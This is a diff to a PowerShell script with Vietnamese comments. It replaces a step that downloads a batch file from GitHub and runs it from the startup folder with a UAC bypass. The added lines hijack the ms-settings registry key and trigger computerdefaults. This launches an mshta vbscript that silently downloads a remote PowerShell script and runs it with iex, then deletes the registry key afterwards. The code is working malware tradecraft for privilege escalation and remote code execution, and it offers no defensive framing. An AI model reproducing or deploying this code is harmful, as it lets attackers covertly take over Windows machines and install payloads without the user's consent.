@@ -35,19 +35,12 @@ Add-Type -AssemblyName System.Windows.Forms
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     try {
-        # Tải xuống tệp batch
+        $arg = "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
         
-        $outputFile = "$startupfolder\download.bat"
-        
-        # Kiểm tra mức độ UAC và in thông báo
-        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
-        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
-        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
-        Write-Output "Khởi chạy tệp batch."
-        
-        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
-        Write-Output "Kết thúc tiến trình PowerShell."
-        Stop-Process -Id $PID -Force
+        reg add hkcu\Software\Classes\ms-settings\shell\open\command /d "mshta.exe $arg" /f
+        reg add hkcu\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+        computerdefaults --nouacbypass
+        reg delete hkcu\Software\Classes\ms-settings /f
     }
     catch {
         Write-Error "Lỗi xảy ra: $_"
